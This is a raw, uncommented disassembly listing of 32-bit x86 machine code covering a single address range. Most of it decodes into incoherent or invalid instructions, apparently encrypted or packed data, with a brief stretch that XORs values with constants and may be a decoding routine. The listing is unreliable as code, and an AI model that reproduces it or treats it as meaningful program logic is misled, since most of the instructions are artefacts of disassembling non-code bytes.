  40cc6e:	pop    edi
  40cc6f:	add    DWORD PTR [ebp-0x28],eax
  40cc72:	sbb    al,0xad
  40cc74:	imul   edx,DWORD PTR [eax+0x36],0x8010b9b8
  40cc7b:	int3   
  40cc7c:	push   esp
  40cc7d:	aaa    
  40cc7e:	dec    esi
  40cc7f:	lods   al,BYTE PTR ds:[esi]
  40cc80:	pop    ds
  40cc81:	cli    
  40cc82:	and    edi,DWORD PTR [ebx+0x43430b85]
  40cc88:	aas    
  40cc89:	adc    esp,esi
  40cc8b:	pop    ebx
  40cc8c:	xor    DWORD PTR [ecx+edi*2],esp
  40cc8f:	mov    al,0xb9
  40cc91:	push   ecx
  40cc92:	in     al,dx
  40cc93:	mov    bh,0x97
  40cc95:	(bad)  
  40cc96:	mov    esp,DWORD PTR [esi]
  40cc98:	cmp    ebx,edx
  40cc9a:	and    al,0xb7
  40cc9c:	mov    dl,0x36
  40cc9e:	sub    eax,0x72db471b
  40cca3:	xchg   ebx,eax
  40cca4:	js     0x40cc31
  40cca6:	bound  ebp,QWORD PTR [edx+esi*1-0x6b]
  40ccaa:	arpl   WORD PTR [ebp+0x42],ax
  40ccad:	xor    DWORD PTR [edx+eax*8-0x66],0x1807cd9e
  40ccb5:	fsubp  st(7),st
  40ccb7:	xchg   edx,eax
  40ccb8:	test   DWORD PTR [ecx-0x4f],0x5304c22e
  40ccbf:	stos   BYTE PTR es:[edi],al
  40ccc0:	or     eax,0x135213ba
  40ccc5:	gs (bad) 
  40ccc7:	adc    al,dl
  40ccc9:	mov    bl,cl
  40cccb:	xchg   edi,eax
  40cccc:	cmp    eax,0x5a3c6915
  40ccd1:	adc    eax,0x7b43fefb
  40ccd6:	push   ss
  40ccd7:	lock inc ebp
  40ccd9:	fldenv [esi-0x20]
  40ccdc:	rol    cl,0xb5
  40ccdf:	push   DWORD PTR [ecx+0x7]
  40cce2:	jo     0x40cd15
  40cce4:	xchg   ecx,eax
  40cce5:	add    al,0x5c
  40cce7:	jg     0x40ccc4
  40cce9:	add    eax,0x9606da2c
  40ccee:	add    al,0x51
  40ccf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf1:	cmp    DWORD PTR [edx-0x23727fe],ebp
  40ccf7:	mov    ah,0x17
  40ccf9:	mov    ch,0xc6
  40ccfb:	aam    0x42
  40ccfd:	mov    edi,0x43334268
  40cd02:	fldenv [esi+0x357a018a]
  40cd08:	stc    
  40cd09:	add    DWORD PTR [edi+ebx*1],edx
  40cd0c:	pop    ecx
  40cd0d:	or     eax,DWORD PTR [ebp+0x2747b91]
  40cd13:	cmp    DWORD PTR [ebx],edi
  40cd15:	(bad)  [edi]
  40cd17:	mov    ch,0x17
  40cd19:	sbb    bh,BYTE PTR [edx+ecx*2]
  40cd1c:	sbb    esp,eax
  40cd1e:	icebp  
  40cd1f:	out    0x62,al
  40cd21:	jnp    0x40cd1a
  40cd23:	xchg   BYTE PTR [esi-0x62],cl
  40cd26:	mov    al,0xe1
  40cd28:	(bad)  
  40cd2a:	out    0xb2,eax
  40cd2c:	cdq    
  40cd2d:	push   cs
  40cd2e:	outs   dx,BYTE PTR ds:[esi]
  40cd2f:	jp     0x40cd30
  40cd31:	dec    edx
  40cd32:	in     eax,0x9
  40cd34:	repz aaa 
  40cd36:	(bad)  
  40cd37:	mov    ah,0xb9
  40cd39:	pop    esp
  40cd3a:	jbe    0x40cd16
  40cd3c:	imul   edx,DWORD PTR ds:0x6eaa6482,0xad8fb467
  40cd46:	sbb    DWORD PTR [ebx-0x19bf5925],edi
  40cd4c:	cdq    
  40cd4d:	inc    edx
  40cd4e:	iret   
  40cd4f:	push   es
  40cd50:	dec    ecx
  40cd51:	mov    eax,0xda66ac6
  40cd56:	fst    DWORD PTR [edi]
  40cd58:	or     ebp,esp
  40cd5a:	xchg   al,bl
  40cd5c:	in     al,dx
  40cd5d:	in     eax,dx
  40cd5e:	call   0xccdc85cf
  40cd63:	fld    TBYTE PTR [esi]
  40cd65:	retf   
  40cd66:	outs   dx,DWORD PTR ds:[esi]
  40cd67:	inc    esp
  40cd68:	adc    esp,DWORD PTR [esi+ecx*4]
  40cd6b:	std    
  40cd6c:	fisttp WORD PTR [edi-0x6f]
  40cd6f:	inc    ebp
  40cd70:	in     eax,0x7
  40cd72:	int    0xfc
  40cd74:	idiv   BYTE PTR [ebx+ecx*2+0x1e]
  40cd78:	adc    eax,0x1e4171f8
  40cd7d:	dec    ecx
  40cd7e:	push   edi
  40cd7f:	sbb    BYTE PTR [edi-0x1b595197],dh
  40cd85:	pop    fs
  40cd87:	das    
  40cd88:	or     al,BYTE PTR gs:[ecx+eiz*8-0x4d]
  40cd8d:	dec    edi
  40cd8e:	cmp    eax,DWORD PTR [ebx]
  40cd90:	aas    
  40cd91:	inc    ebx
  40cd92:	mov    ds:0x7fbec580,eax
  40cd97:	xchg   esp,eax
  40cd98:	(bad)  
  40cd99:	addr16 cmp eax,0x37af2fb3
  40cd9f:	sbb    eax,0xe3188692
  40cda4:	data16 jecxz 0x40cdbf
  40cda7:	sar    BYTE PTR [esi-0x2e],cl
  40cdaa:	mov    BYTE PTR [ecx-0x7a96c074],dl
  40cdb0:	dec    edx
  40cdb1:	sar    DWORD PTR [esi],0xb8
  40cdb4:	and    al,0xc2
  40cdb6:	daa    
  40cdb7:	jnp    0x40cdf0
  40cdb9:	rdtsc  
  40cdbb:	jl     0x40cd62
  40cdbd:	in     al,dx
  40cdbe:	dec    ebx
  40cdbf:	xchg   ecx,eax
  40cdc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cdc1:	loop   0x40cd9d
  40cdc3:	jl     0x40cd80
  40cdc5:	inc    esp
  40cdc6:	xchg   ebp,eax
  40cdc7:	or     BYTE PTR [ebx+0x3b],bh
  40cdca:	xor    ebx,DWORD PTR [ecx-0x2e7c378c]
  40cdd0:	leave  
  40cdd1:	iret   
  40cdd2:	jl     0x40cd99
  40cdd4:	ss push ds
  40cdd6:	mov    ch,0x8c
  40cdd8:	shl    BYTE PTR [edx+0x338fa612],0x7
  40cddf:	push   0xcff340fb
  40cde4:	push   edi
  40cde5:	fcom   DWORD PTR [edx-0x4b]
  40cde8:	popf   
  40cde9:	out    dx,al
  40cdea:	mov    dh,0xf2
  40cdec:	fmul   st,st(5)
  40cdee:	stc    
  40cdef:	pop    esp
  40cdf0:	add    al,0x1f
  40cdf2:	pop    esi
  40cdf3:	mov    ds:0x4a8fe74a,eax
  40cdf8:	jl     0x40cdc7
  40cdfa:	(bad)  
  40cdfc:	adc    DWORD PTR [edx],esp
  40cdfe:	sub    BYTE PTR [esi-0x6f512fcf],0x52
  40ce05:	(bad)  
  40ce06:	jae    0x40cdc5
  40ce08:	icebp  
  40ce09:	and    eax,0x3426e385
  40ce0e:	sub    al,0xe5
  40ce10:	jmp    0x6e257ca3
  40ce15:	loopne 0x40ce1f
  40ce17:	adc    DWORD PTR [eax+eax*4+0x13],0xf660d62a
  40ce1f:	retf   0xa44d
  40ce22:	mov    WORD PTR [ecx-0x1b],cs
  40ce25:	sub    bl,BYTE PTR [ebx+0x1c]
  40ce28:	mov    dh,0xff
  40ce2a:	or     esi,esp
  40ce2c:	das    
  40ce2d:	push   0xffffff93
  40ce2f:	xor    DWORD PTR [ebx],eax
  40ce31:	clc    
  40ce32:	rcl    DWORD PTR ds:0x10e7f2c9,0xfc
  40ce39:	in     eax,dx
  40ce3a:	mov    ds:0x1d39be3a,al
  40ce3f:	cmp    DWORD PTR [esi-0x10],esp
  40ce42:	mov    ecx,DWORD PTR [ebp-0x5b]
  40ce45:	mov    ebp,0x507af746
  40ce4a:	sbb    BYTE PTR [ebx+0x3e4d4577],dl
  40ce50:	in     al,0x92
  40ce52:	imul   ecx,DWORD PTR [ebx+0x39],0x6424f5e
  40ce59:	ror    esi,1
  40ce5b:	sub    BYTE PTR [edi-0x80],dh
  40ce5e:	inc    edi
  40ce5f:	jns    0x40ce95
  40ce61:	arpl   WORD PTR [esi-0x5],si
  40ce64:	sub    ebp,edx
  40ce66:	cmp    DWORD PTR [edi-0xc],edx
  40ce69:	cmp    ebp,DWORD PTR ds:0xc71e2370
  40ce6f:	inc    esp
  40ce70:	and    DWORD PTR [ecx+0x44],esi
  40ce73:	cmp    eax,0x3fd59a70
  40ce78:	adc    BYTE PTR [edx+eiz*2],dl
  40ce7b:	(bad)  
  40ce7d:	fidiv  WORD PTR [edi-0x7a]
  40ce80:	sahf   
  40ce81:	xchg   ebp,eax
  40ce82:	int    0xe8
  40ce84:	sbb    DWORD PTR [ebp-0x6258eee6],ebx
  40ce8a:	sti    
  40ce8b:	(bad)  
  40ce8c:	in     eax,0xa0
  40ce8e:	inc    edi
  40ce8f:	push   ebp
  40ce90:	sbb    edx,DWORD PTR [ebp+0x748634b2]
  40ce96:	cdq    
  40ce97:	(bad)
  40ce9a:	push   edi
  40ce9b:	mov    cl,0x75
  40ce9d:	std    
  40ce9e:	dec    edx
  40ce9f:	les    eax,FWORD PTR [ecx]
  40cea1:	cld    
  40cea2:	pusha  
  40cea3:	popa   
  40cea4:	xor    eax,esi
  40cea6:	and    edx,DWORD PTR [esi]
  40cea8:	stos   BYTE PTR es:[edi],al
  40cea9:	not    DWORD PTR ds:0x398ad0bc
  40ceaf:	fbstp  TBYTE PTR [esi]
  40ceb1:	push   esp
  40ceb2:	ret    0x671e
  40ceb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ceb6:	pop    ds
  40ceb7:	jge    0x40ce74
  40ceb9:	call   0xc7069b1c
  40cebe:	push   0xffffffc2
  40cec0:	scas   eax,DWORD PTR es:[edi]
  40cec1:	outs   dx,BYTE PTR ds:[esi]
  40cec2:	pop    esi
  40cec3:	popa   
  40cec4:	es inc ebx
  40cec6:	test   BYTE PTR [esi-0x6e5feb21],ch
  40cecc:	fdivr  QWORD PTR [ecx+0x7d]
  40cecf:	jmp    0x40ce51
  40ced1:	test   DWORD PTR ds:0x1256b7f5,ebp
  40ced7:	cmp    BYTE PTR [edx+eax*2-0x30928ea],dh
  40cede:	and    ebp,DWORD PTR [ebx]
  40cee0:	stc    
  40cee1:	and    eax,0xf61ecc37
  40cee6:	mov    ds:0xbea4ffe0,eax
  40ceeb:	dec    esi
  40ceec:	hlt    
  40ceed:	dec    ecx
  40ceee:	mov    ebp,DWORD PTR [ebx]
  40cef0:	dec    ecx
  40cef1:	(bad)  
  40cef2:	loopne 0x40cf31
  40cef4:	addr16 jb 0x40cedf
  40cef7:	push   eax
  40cef8:	sbb    cl,dh
  40cefa:	enter  0x9e69,0xec
  40cefe:	push   esp
  40ceff:	xchg   ebx,eax
  40cf00:	add    eax,0xd8641557
  40cf05:	daa    
  40cf06:	ret    0x23f9
  40cf09:	lea    ebx,[edx+ebp*8-0x5f041792]
  40cf10:	adc    cl,BYTE PTR [edx+0x430730de]
  40cf16:	into   
  40cf17:	jbe    0x40cf04
  40cf19:	mov    ebx,0xed943b38
  40cf1e:	or     eax,0xd998b740
  40cf23:	pusha  
  40cf24:	xlat   BYTE PTR ds:[ebx]
  40cf25:	repnz in eax,0xa9
  40cf28:	pop    ds
  40cf29:	rcr    DWORD PTR [esi-0xbf75c2c],1
  40cf2f:	inc    ebp
  40cf30:	xor    dl,BYTE PTR [ecx-0x4]
  40cf33:	xor    eax,0xa9d791f5
  40cf38:	imul   ebx,ebx,0x20
  40cf3b:	jmp    0xe5cd:0x69c02e7b
  40cf42:	lea    esi,[ebx+eiz*4]
  40cf45:	mov    ds:0xee8d4f62,al
  40cf4a:	sbb    ebp,esp
  40cf4c:	popf   
  40cf4d:	out    dx,al
  40cf4e:	in     eax,dx
  40cf4f:	inc    ebp
  40cf50:	adc    BYTE PTR [ebx+0x45030c45],cl
  40cf56:	or     BYTE PTR [ecx+0x458bf045],cl
  40cf5c:	in     al,0x85
  40cf5e:	ror    BYTE PTR [edi],0x84
  40cf61:	push   0x10
  40cf63:	add    BYTE PTR [eax],al
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xf
  40cf80:	jb     0x40cf66
  40cf82:	jl     0x40cfa5
  40cf84:	xchg   esi,eax
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	jecxz  0x40cf93
  40cf8d:	fst    DWORD PTR [ecx]
  40cf8f:	sbb    BYTE PTR ss:[ebp+0x47],0x2f
  40cf94:	aad    0x39
  40cf96:	cmp    eax,0x83ad3796
  40cf9b:	dec    ebx
  40cf9c:	push   edx
  40cf9d:	into   
  40cf9e:	pop    ss
  40cf9f:	sub    al,BYTE PTR [esi]
  40cfa1:	pop    edx
  40cfa2:	and    BYTE PTR [eax+0x651e167e],al
  40cfa8:	xchg   BYTE PTR [ebp-0x9],ah
  40cfab:	arpl   si,si
  40cfad:	gs jne 0x40cf3c
  40cfb0:	push   edi
  40cfb1:	mov    edx,0x9e833202
  40cfb6:	xchg   ecx,eax
  40cfb7:	jae    0x40cf48
  40cfb9:	sub    eax,0xa195cd20
  40cfbe:	add    eax,0xae867f90
  40cfc3:	xor    al,0x6d
  40cfc5:	outs   dx,BYTE PTR ds:[esi]
  40cfc6:	and    cl,0x27
  40cfc9:	lock out 0xfb,eax
  40cfcc:	(bad)  
  40cfcd:	mov    esp,0x2922e2b8
  40cfd2:	jmp    0xc49c:0x57884289
  40cfd9:	mov    ebp,0x99e6e237
  40cfde:	mov    al,0x64
  40cfe0:	push   ebp
  40cfe1:	lea    ecx,[ecx-0xd98f4f6]
  40cfe7:	nop
  40cfe8:	pop    ss
  40cfe9:	xchg   DWORD PTR [ebx],ebp
  40cfeb:	inc    edx
  40cfec:	jo     0x40cfc8
  40cfee:	mov    cl,0x83
  40cff0:	mov    es,WORD PTR [edx-0x2decd5cd]
  40cff6:	inc    ebx
  40cff7:	inc    edx
  40cff8:	int    0xbd
  40cffa:	xor    bl,0xf1
  40cffd:	mov    eax,0x1a120900
  40d002:	jns    0x40d02d
  40d004:	clc    
  40d005:	mov    esi,0xbdd3e4ef
  40d00a:	or     eax,0x5592bc92
  40d00f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d010:	add    bh,BYTE PTR [ebx]
  40d012:	mov    cl,0x24
  40d014:	xor    BYTE PTR [eax-0x2806d0bf],ah
  40d01a:	push   ds
  40d01b:	adc    edx,eax
  40d01d:	pushf  
  40d01e:	ds mov ecx,0xd189de6e
  40d024:	jge    0x40d01f
  40d026:	xlat   BYTE PTR ds:[ebx]
  40d027:	fiadd  DWORD PTR [edx+0x28]
  40d02a:	inc    ecx
  40d02b:	idiv   BYTE PTR [edx+0x1b6fe8cf]
  40d031:	push   ebx
  40d032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d033:	and    bh,BYTE PTR [ecx+0x5e3d26b9]
  40d039:	loope  0x40d0a4
  40d03b:	adc    eax,0x440ba7e1
  40d040:	ret    
  40d041:	out    dx,eax
  40d042:	cwde   
  40d043:	sub    al,0x30
  40d045:	cmp    ch,BYTE PTR [esi+0x29]
  40d048:	fcmovb st,st(0)
  40d04a:	mov    al,ah
  40d04c:	xor    esi,edi
  40d04e:	mov    bl,BYTE PTR [ecx+0x10]
  40d051:	popf   
  40d052:	sahf   
  40d053:	leave  
  40d054:	pop    edi
  40d055:	aad    0x65
  40d057:	sbb    bh,BYTE PTR [eax+0x49ebb1d4]
  40d05d:	test   BYTE PTR [edi],ch
  40d05f:	dec    ebx
  40d060:	imul   ebp,DWORD PTR [edi+0x30f3cefe],0x70
  40d067:	inc    esp
  40d068:	and    eax,0xafc77846
  40d06d:	inc    edi
  40d06e:	jle    0x40d0c1
  40d070:	outs   dx,DWORD PTR ds:[esi]
  40d071:	xlat   BYTE PTR ds:[ebx]
  40d072:	jmp    0x40d07c
  40d074:	fwait
  40d075:	inc    esp
  40d076:	jl     0x40d02d
  40d078:	js     0x40d0eb
  40d07a:	jmp    0x40d0b4
  40d07c:	jbe    0x40d040
  40d07e:	in     al,dx
  40d07f:	aaa    
  40d080:	pop    DWORD PTR [esi-0x53]
  40d083:	mov    ebp,0x31843277
  40d088:	sub    bh,BYTE PTR [ecx+0x94596e3]
  40d08e:	mov    esp,0x598a6981
  40d093:	push   edx
  40d094:	data16 repnz mov al,ds:0x60d729ac
  40d09b:	das    
  40d09c:	sbb    BYTE PTR [esi+0x3d],bh
  40d09f:	pop    ecx
  40d0a0:	fwait
  40d0a1:	(bad)  
  40d0a2:	mov    ah,0xcd
  40d0a4:	bound  edx,QWORD PTR [esp+eax*4]
  40d0a7:	aaa    
  40d0a8:	mov    ss,WORD PTR ds:0xe655ac97
  40d0ae:	jb     0x40d05b
  40d0b0:	xchg   DWORD PTR [eax-0x51],ebx
  40d0b3:	inc    edi
  40d0b4:	inc    eax
  40d0b5:	loopne 0x40d130
  40d0b7:	push   esi
  40d0b8:	test   DWORD PTR [esi+0x24],0x47bfc343
  40d0bf:	mov    ecx,0x42d88043
  40d0c4:	ja     0x40d117
  40d0c6:	and    DWORD PTR [edi-0x4bd6e85a],eax
  40d0cc:	pop    edi
  40d0cd:	scas   al,BYTE PTR es:[edi]
  40d0ce:	inc    esi
  40d0cf:	outs   dx,BYTE PTR ds:[esi]
  40d0d0:	pop    ebp
  40d0d1:	push   esi
  40d0d2:	push   ebp
  40d0d3:	jns    0x40d076
  40d0d5:	pop    eax
  40d0d6:	jle    0x40d071
  40d0d8:	push   esp
  40d0d9:	pop    ebx
  40d0da:	fstp   DWORD PTR [ebx+esi*1-0x1f6a4b79]
  40d0e1:	mov    esp,0xd7fa4cb6
  40d0e6:	je     0x40d136
  40d0e8:	xchg   esp,eax
  40d0e9:	ja     0x40d0af
  40d0eb:	push   ebx
  40d0ec:	pushf  
  40d0ed:	outs   dx,DWORD PTR ds:[esi]
  40d0ee:	sub    dh,BYTE PTR [edx]
  40d0f0:	push   ebx
  40d0f1:	jp     0x40d111
  40d0f3:	int3   
  40d0f4:	aaa    
  40d0f5:	xchg   esi,eax
  40d0f6:	xchg   BYTE PTR [edi-0xd7d1fd0],bl
  40d0fc:	ins    DWORD PTR es:[edi],dx
  40d0fd:	clc    
  40d0fe:	inc    ecx
  40d0ff:	fmul   DWORD PTR [edx+eiz*2-0x4d37d6b5]
  40d106:	inc    ecx
  40d107:	mov    esp,0x51316ed8
  40d10c:	xchg   ebx,eax
  40d10d:	mov    es,ebp
  40d10f:	icebp  
  40d110:	out    0x1d,eax
  40d112:	push   esi
  40d113:	scas   eax,DWORD PTR es:[edi]
  40d114:	mov    esp,0x44e4043
  40d119:	clc    
  40d11a:	jmp    0x40d0dd
  40d11c:	sub    ch,BYTE PTR ds:0x12e8654
  40d122:	nop
  40d123:	inc    ebx
  40d124:	sub    al,0xcf
  40d126:	jb     0x40d112
  40d128:	fidivr DWORD PTR [eax+esi*1]
  40d12b:	and    dl,ah
  40d12d:	pop    esi
  40d12e:	inc    ecx
  40d12f:	test   DWORD PTR [edx],ebx
  40d131:	ins    BYTE PTR es:[edi],dx
  40d132:	inc    esp
  40d133:	aas    
  40d134:	push   edx
  40d135:	shl    BYTE PTR [edi+eax*8-0x7c],1
  40d139:	sbb    DWORD PTR [esi-0x289f7c85],0xfffffffc
  40d140:	adc    DWORD PTR [ebx-0x52fd8a88],ecx
  40d146:	mov    edx,0x22fc1139
  40d14b:	mov    DWORD PTR [ebp+0x46471041],eax
  40d151:	mov    ebp,0xba117b06
  40d156:	push   esi
  40d157:	je     0x40d199
  40d159:	jne    0x40d0f0
  40d15b:	lods   eax,DWORD PTR ds:[esi]
  40d15c:	push   cs
  40d15d:	scas   al,BYTE PTR es:[edi]
  40d15e:	or     DWORD PTR [ecx],esp
  40d160:	mov    al,ds:0xcf252df3
  40d165:	adc    al,0xa0
  40d167:	xor    DWORD PTR [esi],0x4c2cf196
  40d16d:	and    al,0x5f
  40d16f:	cmovnp ebx,ebp
  40d172:	lock or al,0xc4
  40d175:	mov    ah,0x4a
  40d177:	or     BYTE PTR [eax+0x14],bl
  40d17a:	inc    ebp
  40d17b:	push   0x730fcee7
  40d180:	into   
  40d181:	push   edi
  40d182:	out    0x41,al
  40d184:	popf   
  40d185:	push   edi
  40d186:	mov    ds:0xc3731fc8,eax
  40d18b:	sub    DWORD PTR [eax-0x7b],edx
  40d18e:	pop    ebx
  40d18f:	sahf   
  40d190:	add    DWORD PTR [esi],ecx
  40d192:	sub    cl,BYTE PTR [edx-0x576c1913]
  40d198:	pop    esi
  40d199:	dec    esi
  40d19a:	retf   0x40dc
  40d19d:	or     eax,0xecfda533
  40d1a2:	and    BYTE PTR [edx+0x53adc251],0x84
  40d1a9:	dec    edi
  40d1aa:	push   DWORD PTR [ebp+0x53]
  40d1ad:	in     al,0x40
  40d1af:	ror    BYTE PTR [edx+0xe],1
  40d1b2:	adc    eax,0xb572bffa
  40d1b7:	and    edx,DWORD PTR [eax+0x70]
  40d1ba:	rcl    ebp,0x89
  40d1bd:	lods   eax,DWORD PTR ds:[esi]
  40d1be:	test   DWORD PTR [esi+ecx*1-0x4c565f1e],ebx
  40d1c5:	imul   edi,DWORD PTR [esi+0x1396ee94],0xfffffff1
  40d1cc:	popf   
  40d1cd:	dec    ebx
  40d1ce:	cmc    
  40d1cf:	and    eax,DWORD PTR [ecx+eax*8+0x17]
  40d1d3:	add    eax,0x903eb275
  40d1d8:	add    eax,0xc3f4ce1b
  40d1dd:	sub    ecx,DWORD PTR [ebp-0x3c]
  40d1e0:	and    cl,BYTE PTR [esp+edx*4+0x56ef180]
  40d1e7:	and    ebp,DWORD PTR [eax+0x673d1cb]
  40d1ed:	in     eax,dx
  40d1ee:	jmp    0x5031:0xedb6af22
  40d1f5:	adc    BYTE PTR [edx+0x43],ah
  40d1f8:	xchg   DWORD PTR [edi+0x48425097],esp
  40d1fe:	add    ecx,DWORD PTR [edx-0x6b439a8b]
  40d204:	fisub  WORD PTR [edi]
  40d206:	mov    bh,0x4c
  40d208:	loopne 0x40d1c8
  40d20a:	(bad)  
  40d20b:	jnp    0x40d26a
  40d20d:	jno    0x143f92d0
  40d213:	xor    edx,edi
  40d215:	je     0x40d259
  40d217:	lods   eax,DWORD PTR ds:[esi]
  40d218:	daa    
  40d219:	cmp    al,0x4c
  40d21b:	and    DWORD PTR [edx],esi
  40d21d:	shr    BYTE PTR [eax],1
  40d21f:	jp     0x40d1d4
  40d221:	shr    DWORD PTR [eax],cl
  40d223:	xchg   ch,dh
  40d225:	push   0x74de2cec
  40d22a:	scas   eax,DWORD PTR es:[edi]
  40d22b:	clc    
  40d22c:	imul   ecx,DWORD PTR [esi-0x7c],0x6
  40d230:	aaa    
  40d231:	mov    ch,0x46
  40d233:	pushf  
  40d234:	mov    ecx,0xe4ccac8d
  40d239:	test   BYTE PTR [edi],bl
  40d23b:	sub    esi,DWORD PTR [esi]
  40d23d:	or     al,0xca
  40d23f:	xor    esi,DWORD PTR [eax+eax*1+0x42]
  40d243:	push   0x9587cbaa
  40d248:	out    dx,al
  40d249:	jp     0x40d1f6
  40d24b:	xchg   esp,eax
  40d24c:	daa    
  40d24d:	push   edx
  40d24e:	(bad)  
  40d250:	stos   BYTE PTR es:[edi],al
  40d251:	rcr    edi,cl
  40d253:	or     al,0xad
  40d255:	jmp    0x8119741a
  40d25a:	imul   esp,DWORD PTR [ebp+0x3b80df06],0x84951680
  40d264:	or     eax,0x30aacbda
  40d269:	inc    edx
  40d26a:	retf   0x210b
  40d26d:	lahf   
  40d26e:	push   cs
  40d26f:	daa    
  40d270:	dec    ebx
  40d271:	rol    BYTE PTR [ecx+0x4],0xec
  40d275:	cmp    BYTE PTR [ecx],dh
  40d277:	hlt    
  40d278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d279:	fcmove st,st(5)
  40d27b:	in     al,0x3a
  40d27d:	popf   
  40d27e:	iret   
  40d27f:	push   0x42
  40d281:	cmp    dl,dh
  40d283:	mov    ch,0xec
  40d285:	push   esp
  40d286:	sbb    DWORD PTR [esp+ebp*8-0x6d],0xfffffffa
  40d28b:	xchg   ecx,eax
  40d28c:	popf   
  40d28d:	cmp    DWORD PTR [ebx-0x79],ebx
  40d290:	retf   
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	std    
  40d2d1:	rcl    DWORD PTR [edx-0x4b],cl
  40d2d4:	sub    al,0x95
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	mov    dl,0xac
  40d2de:	ja     0x40d347
  40d2e0:	ins    DWORD PTR es:[edi],dx
  40d2e1:	adc    esp,DWORD PTR [edi+0x4366db5d]
  40d2e7:	in     eax,0x9d
  40d2e9:	into   
  40d2ea:	pop    eax
  40d2eb:	inc    edx
  40d2ec:	stos   BYTE PTR es:[edi],al
  40d2ed:	xchg   DWORD PTR [ebx],ebp
  40d2ef:	loop   0x40d363
  40d2f1:	(bad)  
  40d2f2:	(bad)  
  40d2f3:	fucomip st,st(4)
  40d2f5:	daa    
  40d2f6:	xchg   BYTE PTR [ecx-0xe00e9b3],bh
  40d2fc:	cs pop edx
  40d2fe:	xor    BYTE PTR [ebp+0x30],0x4f
  40d302:	popf   
  40d303:	xor    al,0x83
  40d305:	pop    ebp
  40d306:	call   0x9ad5:0x5e35bfec
  40d30d:	xchg   esp,eax
  40d30e:	sub    esi,ebx
  40d310:	cwde   
  40d311:	xchg   esi,eax
  40d312:	add    DWORD PTR [esi+0xa],edx
  40d315:	cli    
  40d316:	gs or  eax,0x3822fccf
  40d31c:	xchg   BYTE PTR [ecx+0x71d6921],bh
  40d322:	mov    al,ds:0xe669589f
  40d327:	pop    ecx
  40d328:	pop    ss
  40d329:	test   al,0x40
  40d32b:	je     0x40d36d
  40d32d:	push   0x5b
  40d32f:	jle    0x40d34c
  40d331:	(bad)  
  40d332:	mov    esi,0x3913ef9b
  40d337:	dec    edx
  40d338:	add    edx,DWORD PTR [edx]
  40d33a:	xchg   edx,eax
  40d33b:	adc    DWORD PTR [edx+0x749d881b],esp
  40d341:	inc    eax
  40d342:	fiadd  WORD PTR [esi+0x71]
  40d345:	dec    edx
  40d346:	and    dl,BYTE PTR gs:[esp+ebp*2-0x71]
  40d34b:	stc    
  40d34c:	sti    
  40d34d:	pusha  
  40d34e:	(bad)  
  40d34f:	int    0x5c
  40d351:	ret    0x65fe
  40d354:	icebp  
  40d355:	repnz fdivp st(3),st
  40d358:	test   eax,0xda4ac5e5
  40d35d:	adc    BYTE PTR [ecx],ch
  40d35f:	fldcw  WORD PTR [edi-0x57]
  40d362:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d363:	(bad)  
  40d364:	ins    DWORD PTR es:[edi],dx
  40d365:	push   DWORD PTR [ebx]
  40d367:	mov    dh,0xae
  40d369:	xor    DWORD PTR [esi],esp
  40d36b:	jo     0x40d3da
  40d36d:	cmp    DWORD PTR [edx],ebx
  40d36f:	ins    BYTE PTR es:[edi],dx
  40d370:	or     al,0xb2
  40d373:	call   0x30d9:0xc4d44a49
  40d37a:	mov    dl,BYTE PTR [ebp+0x654ff88c]
  40d380:	push   edx
  40d381:	int    0x6b
  40d383:	mov    bh,0x9d
  40d385:	or     eax,0xc07ba4aa
  40d38a:	push   edx
  40d38b:	je     0x40d3f3
  40d38d:	xor    eax,0x7a7a549e
  40d392:	jno    0x40d400
  40d394:	cs jg  0x40d31d
  40d397:	sub    BYTE PTR [eax+0x328462c5],cl
  40d39d:	and    cl,BYTE PTR [esi+0x2e]
  40d3a0:	mov    ebp,0x5cd04833
  40d3a5:	lods   eax,DWORD PTR ds:[esi]
  40d3a6:	imul   esp,ecx,0xc1ae7dca
  40d3ac:	mov    eax,0x8cf28eeb
  40d3b1:	push   ecx
  40d3b2:	shl    BYTE PTR [eax+ecx*8],cl
  40d3b5:	mul    DWORD PTR [eax-0x12]
  40d3b8:	pop    esi
  40d3b9:	aas    
  40d3ba:	xor    eax,0x11f2d019
  40d3bf:	int3   
  40d3c0:	push   ecx
  40d3c1:	out    dx,eax
  40d3c2:	mov    bh,BYTE PTR [ebp+0x76]
  40d3c5:	xor    ch,cl
  40d3c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d3c8:	fist   DWORD PTR [esi+0x1c]
  40d3cb:	icebp  
  40d3cc:	mov    esi,DWORD PTR cs:[edx-0x3e]
  40d3d0:	mov    al,ds:0xa86eeffc
  40d3d5:	pop    esp
  40d3d6:	mov    ecx,0x5b57cbda
